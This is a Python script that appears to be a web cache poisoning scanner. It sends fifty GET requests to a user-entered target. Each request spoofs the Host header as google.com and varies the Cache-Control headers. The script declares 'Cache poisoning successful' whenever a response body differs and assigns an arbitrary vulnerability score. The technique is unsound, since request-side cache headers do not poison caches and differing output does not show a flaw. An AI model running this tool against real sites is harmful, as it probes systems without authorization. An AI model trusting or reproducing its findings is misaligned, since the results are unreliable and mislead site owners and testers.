import requests
import time
from colorama import init, Fore

# Initialize colorama
init()

def perform_cache_poisoning_analysis(url):
    try:
        # Define a list of payloads for cache poisoning
        payloads = [
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=1000', 'Content-Type': 'text/html'}, # CP1
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=0', 'Content-Type': 'text/html'}, # CP2
            {'Host': 'google.com', 'Cache-Control': 'no-store', 'Content-Type': 'text/html'}, # CP3
            {'Host': 'google.com', 'Cache-Control': 'no-cache', 'Content-Type': 'text/html'}, # CP4
            {'Host': 'google.com', 'Cache-Control': 'max-age=0', 'Content-Type': 'text/html'}, # CP5
            {'Host': 'google.com', 'Cache-Control': 'private', 'Content-Type': 'text/html'}, # CP6
            {'Host': 'google.com', 'Cache-Control': 'no-store, must-revalidate', 'Content-Type': 'text/html'}, # CP7
            {'Host': 'google.com', 'Cache-Control': 'public, s-maxage=3600', 'Content-Type': 'text/html'}, # CP8
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=3600, s-maxage=3600', 'Content-Type': 'text/html'}, # CP9
            {'Host': 'google.com', 'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Type': 'text/html'}, # CP10
            {'Host': 'google.com', 'Cache-Control': 'no-cache, max-age=0, must-revalidate', 'Content-Type': 'text/html'}, # CP11
            {'Host': 'google.com', 'Cache-Control': 'public, proxy-revalidate, s-maxage=3600', 'Content-Type': 'text/html'}, # CP12
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=2592000', 'Content-Type': 'text/html'}, # CP13
            {'Host': 'google.com', 'Cache-Control': 'public, must-revalidate, proxy-revalidate', 'Content-Type': 'text/html'}, # CP14
            {'Host': 'google.com', 'Cache-Control': 'public, must-revalidate, max-age=2592000', 'Content-Type': 'text/html'}, # CP15
            {'Host': 'google.com', 'Cache-Control': 'public, immutable, max-age=31536000', 'Content-Type': 'text/html'}, # CP16
            {'Host': 'google.com', 'Cache-Control': 'max-age=0, must-revalidate, no-store', 'Content-Type': 'text/html'}, # CP17
            {'Host': 'google.com', 'Cache-Control': 'no-store, no-cache, must-revalidate', 'Content-Type': 'text/html'}, # CP18
            {'Host': 'google.com', 'Cache-Control': 'no-cache, must-revalidate', 'Content-Type': 'text/html'}, # CP19
            {'Host': 'google.com', 'Cache-Control': 'private, no-cache', 'Content-Type': 'text/html'}, # CP20
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=3600', 'Content-Type': 'text/html'}, # CP21
            {'Host': 'google.com', 'Cache-Control': 'public, no-store, no-cache', 'Content-Type': 'text/html'}, # CP22
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=10', 'Content-Type': 'text/html'}, # CP23
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=31556926', 'Content-Type': 'text/html'}, # CP24
            {'Host': 'google.com', 'Cache-Control': 'private, must-revalidate', 'Content-Type': 'text/html'}, # CP25
            {'Host': 'google.com', 'Cache-Control': 'private, no-store, no-cache', 'Content-Type': 'text/html'}, # CP26
            {'Host': 'google.com', 'Cache-Control': 'no-store, max-age=0', 'Content-Type': 'text/html'}, # CP27
            {'Host': 'google.com', 'Cache-Control': 'no-cache, max-age=10', 'Content-Type': 'text/html'}, # CP28
            {'Host': 'google.com', 'Cache-Control': 'max-age=600', 'Content-Type': 'text/html'}, # CP29
            {'Host': 'google.com', 'Cache-Control': 'no-store, no-cache', 'Content-Type': 'text/html'}, # CP30
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=1800', 'Content-Type': 'text/html'}, # CP31
            {'Host': 'google.com', 'Cache-Control': 'no-cache, max-age=1800', 'Content-Type': 'text/html'}, # CP32
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=7200', 'Content-Type': 'text/html'}, # CP33
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=7200', 'Content-Type': 'text/html'}, # CP34
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=14400', 'Content-Type': 'text/html'}, # CP35
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=14400', 'Content-Type': 'text/html'}, # CP36
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=28800', 'Content-Type': 'text/html'}, # CP37
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=28800', 'Content-Type': 'text/html'}, # CP38
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=57600', 'Content-Type': 'text/html'}, # CP39
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=57600', 'Content-Type': 'text/html'}, # CP40
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=86400', 'Content-Type': 'text/html'}, # CP41
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=86400', 'Content-Type': 'text/html'}, # CP42
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=172800', 'Content-Type': 'text/html'}, # CP43
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=172800', 'Content-Type': 'text/html'}, # CP44
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=345600', 'Content-Type': 'text/html'}, # CP45
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=345600', 'Content-Type': 'text/html'}, # CP46
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=604800', 'Content-Type': 'text/html'}, # CP47
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=604800', 'Content-Type': 'text/html'}, # CP48
            {'Host': 'google.com', 'Cache-Control': 'public, max-age=1209600', 'Content-Type': 'text/html'}, # CP49
            {'Host': 'google.com', 'Cache-Control': 'private, max-age=1209600', 'Content-Type': 'text/html'}, # CP50
        ]

        # Assign payload variable values
        payload_variables = [f"CP{i+1}" for i in range(len(payloads))]

        # Initialize variables to track response differences and timing
        baseline_response = None
        successful_responses = []

        # Function to determine degree of vulnerability
        def degree_of_vulnerability(payload_index):
            if 'no-store' in payloads[payload_index]['Cache-Control'] or 'no-cache' in payloads[payload_index]['Cache-Control']:
                return 5
            elif 'private' in payloads[payload_index]['Cache-Control']:
                return 3
            elif 'public' in payloads[payload_index]['Cache-Control']:
                return 1
            else:
                return 0

        # Send multiple GET requests with different payloads
        for i, payload in enumerate(payloads):
            print(f"Testing payload {payload_variables[i]}: {payload}")
            start_time = time.time()  # Record start time of request

            try:
                response = requests.get(url, headers=payload, allow_redirects=False) # Disable redirects
            except requests.exceptions.TooManyRedirects:
                print(Fore.RED + f"An error occurred with {payload_variables[i]}: Exceeded redirects limit.")
                continue
            
            end_time = time.time()  # Record end time of request

            # Check if the response status code indicates success (2xx or 3xx)
            if response.status_code in range(200, 400):
                # Save the first successful response as the baseline for comparison
                if baseline_response is None:
                    baseline_response = response
                elif response.text != baseline_response.text:
                    successful_responses.append({
                        'payload_variable': payload_variables[i],
                        'payload': payload,
                        'response': response,
                        'time': end_time - start_time,
                        'degree_of_vulnerability': degree_of_vulnerability(i)
                    })

        if successful_responses:
            print(Fore.GREEN + "Cache poisoning successful!")
            # Print the successful response for analysis
            total_vulnerability = 0
            for res in successful_responses:
                print(f"Payload Variable: {res['payload_variable']}")
                print(f"Payload: {res['payload']}")
                print(f"Response Time: {res['time']:.2f} seconds")
                print(f"Degree of Vulnerability: {res['degree_of_vulnerability']}")
                print(res['response'].text)
                total_vulnerability += res['degree_of_vulnerability']
            
            print(Fore.YELLOW + f"Overall Vulnerability Score: {total_vulnerability}")
        else:
            print(Fore.RED + "Cache poisoning unsuccessful. Target website may not be vulnerable.")
    except Exception as e:
        print(Fore.RED + "An error occurred:", str(e))

def main():
    target_url = input("Enter the target website URL: ")
    perform_cache_poisoning_analysis(target_url)

if __name__ == "__main__":
    main()
